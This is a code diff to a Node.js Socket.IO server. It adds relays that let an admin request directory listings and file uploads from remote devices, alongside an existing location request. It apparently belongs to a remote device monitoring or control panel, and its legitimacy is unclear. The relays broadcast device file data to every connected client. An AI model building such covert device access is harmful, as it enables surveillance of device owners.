@@ -124,6 +124,25 @@ io.on('connection', (socket) => {
     io.to(data.deviceId).emit('get_location_once');
   });
 
+  // --- File Manager Relays ---
+  socket.on('request_directory', (data) => {
+    console.log(`📁 Admin requested directory listing for:`, data.deviceId, `Path: ${data.path || 'root'}`);
+    io.to(data.deviceId).emit('request_directory', { path: data.path });
+  });
+
+  socket.on('directory_data', (data) => {
+    io.emit('directory_data', data);
+  });
+
+  socket.on('directory_error', (data) => {
+    io.emit('directory_error', data);
+  });
+
+  socket.on('trigger_download_file', (data) => {
+    console.log(`⬇️ Admin requested file upload from:`, data.deviceId, `File: ${data.path}`);
+    io.to(data.deviceId).emit('trigger_download_file', { path: data.path });
+  });
+
   // Dashboard requests list of online devices
   socket.on('list_devices', async () => {
     try {
